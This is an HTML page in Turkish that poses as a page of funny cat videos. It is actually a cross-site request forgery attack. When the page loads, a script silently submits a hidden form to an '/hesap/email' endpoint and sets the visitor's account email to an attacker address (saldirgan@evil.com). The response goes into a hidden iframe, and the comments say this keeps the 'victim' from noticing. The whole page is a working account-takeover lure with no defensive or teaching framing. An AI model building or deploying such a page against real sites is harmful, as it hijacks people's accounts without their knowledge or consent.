<!doctype html>
<html lang="tr">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>En Komik Kedi Videoları 😹</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{min-height:100vh;background:#faf7f0;color:#2a2a2a;
      font-family:system-ui,-apple-system,"Segoe UI",sans-serif;line-height:1.6;
      display:flex;align-items:center;justify-content:center;padding:24px}
    .page{max-width:520px;text-align:center}
    .page .emoji{font-size:72px;margin-bottom:12px}
    .page h1{font-size:30px;font-weight:800;margin-bottom:10px}
    .page p{font-size:16px;color:#555;margin-bottom:22px}
    .page .thumb{width:100%;height:260px;border-radius:16px;
      background:linear-gradient(135deg,#ffd194,#d1913c);display:flex;
      align-items:center;justify-content:center;font-size:90px}
    .page small{display:block;margin-top:20px;color:#999;font-size:12px}
    /* gizli iframe: form buraya gonderilince kurban bu sayfada kalir, hic fark etmez */
    .sink{display:none}
  </style>
</head>
<body>
  <div class="page">
    <div class="emoji">😹</div>
    <h1>Günün En Komik Kedi Videoları</h1>
    <p>Bugün internetin en çok güldüren 10 kedi anını senin için derledik. Keyifli seyirler!</p>
    <div class="thumb">🐱</div>
    <small>reklam destekli ücretsiz içerik</small>
  </div>

  <!-- Form'un gonderilecegi gizli iframe (kurban sayfadan ayrilmaz) -->
  <iframe name="sink" class="sink"></iframe>

    <form action="/hesap/email" method="post" target="sink" id="csrf">
      <input type="hidden" name="email" value="saldirgan@evil.com">
    </form>
    <script>
      document.getElementById("csrf").submit()
    </script>

</body>
</html>
